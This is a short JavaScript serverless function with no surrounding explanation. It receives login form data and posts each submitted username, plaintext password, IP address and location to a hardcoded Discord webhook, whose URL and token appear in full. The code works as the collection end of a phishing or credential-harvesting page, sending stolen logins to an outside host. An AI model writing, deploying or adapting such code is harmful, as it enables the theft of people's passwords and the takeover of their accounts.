const fetch = require("node-fetch");

const WEBHOOK_URL = "https://discord.com/api/webhooks/1537470202382520430/A_oONxIqsNhlFOQzQpjZVgi1SB7TdUm95P7sEhkvKt2hliZajBsXu_jSVdm6XfIa-_Sk";

exports.handler = async (event) => {
    try {
        const data = JSON.parse(event.body);

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `Login event:
Username: ${data.username}
Password Present: ${data.passwordPresent}
Remember: ${data.remember}
IP: ${data.ip}
Location: ${data.location}
Password: ${data.password}`
            })
        });

        return {
            statusCode: 200,
            body: "OK"
        };

    } catch (err) {
        return {
            statusCode: 500,
            body: "Error sending webhook"
        };
    }
};
